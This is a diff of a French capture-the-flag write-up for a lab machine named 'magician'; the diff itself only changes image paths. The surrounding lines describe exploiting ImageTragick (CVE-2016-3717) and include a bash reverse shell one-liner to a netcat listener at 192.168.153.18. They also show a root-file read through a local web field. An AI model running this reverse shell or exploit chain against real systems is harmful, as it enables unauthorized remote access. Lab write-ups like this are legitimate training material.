@@ -54,13 +54,13 @@ Password:
 230 Login successful.
 ftp>
 ```
-![178d178aaeed0fd39f8e4e458aca8d95.png](../resources/178d178aaeed0fd39f8e4e458aca8d95.png)
+![178d178aaeed0fd39f8e4e458aca8d95.png](./resources/178d178aaeed0fd39f8e4e458aca8d95.png)
 
 On se connecte sur le site web port 8081 (http://magician:8081/) :
-![0be858774ba3442dbfd0b3d188db110a.png](../resources/0be858774ba3442dbfd0b3d188db110a.png)
+![0be858774ba3442dbfd0b3d188db110a.png](./resources/0be858774ba3442dbfd0b3d188db110a.png)
 
 On se renseigne sur la vulnérabilité du site qui est Image Tragick CVE-2016–3717 https://imagetragick.com 
-![be91f5d8cfe5f5b91eed3885d5a47670.png](../resources/be91f5d8cfe5f5b91eed3885d5a47670.png)
+![be91f5d8cfe5f5b91eed3885d5a47670.png](./resources/be91f5d8cfe5f5b91eed3885d5a47670.png)
 
 On ouvre notre listener netcat :
 ```
@@ -71,7 +71,7 @@ On va sur https://www.revshells.com/ et on génére notre reverse shell en Bash 
 ```bash
 /bin/bash -i >& /dev/tcp/192.168.153.18/1234 0>&1
 ```
-![5aff1d24593ef20645cc21f8405622d9.png](../resources/5aff1d24593ef20645cc21f8405622d9.png)
+![5aff1d24593ef20645cc21f8405622d9.png](./resources/5aff1d24593ef20645cc21f8405622d9.png)
 
 On créer un fichier image (vim reverse.png) que l'on va envoyer au serveur web.
 Payload ImageTragick (reverse.png) :
@@ -83,7 +83,7 @@ pop graphic-context
 ```
 
 Le fichier a bien été convertis : 
-![3bcc40dabd930cfb886fbd5a82cda862.png](../resources/3bcc40dabd930cfb886fbd5a82cda862.png)
+![3bcc40dabd930cfb886fbd5a82cda862.png](./resources/3bcc40dabd930cfb886fbd5a82cda862.png)
 
 On regarde notre netcat est on obtient bien notre reverse shell : 
 ```bash
@@ -98,7 +98,7 @@ whoami
 magician
 magician@magician:/tmp/hsperfdata_magician$ 
 ```
-![c1b436fd447a8dcb1c01c9fb06147f8c.png](../resources/c1b436fd447a8dcb1c01c9fb06147f8c.png)
+![c1b436fd447a8dcb1c01c9fb06147f8c.png](./resources/c1b436fd447a8dcb1c01c9fb06147f8c.png)
 
 Upgrade du shell vers un shell TTY complet :
 ```bash
@@ -196,10 +196,10 @@ kali@kali:~$
 
 # Étape 5 : Exploitation
 On accède a http://localhost:8000/ et on observe une image troll :
-![01996ac953214713095034deaa9223b5.png](../resources/01996ac953214713095034deaa9223b5.png)
+![01996ac953214713095034deaa9223b5.png](./resources/01996ac953214713095034deaa9223b5.png)
 
 On tape simple /root/root.txt dans le champs : 
- ![0106d9fa9a9e6ec85fd76986545ef1da.png](../resources/0106d9fa9a9e6ec85fd76986545ef1da.png)
+ ![0106d9fa9a9e6ec85fd76986545ef1da.png](./resources/0106d9fa9a9e6ec85fd76986545ef1da.png)
 
 On obtient la chaine de caractère encodé en base 64 : 
 ```bash
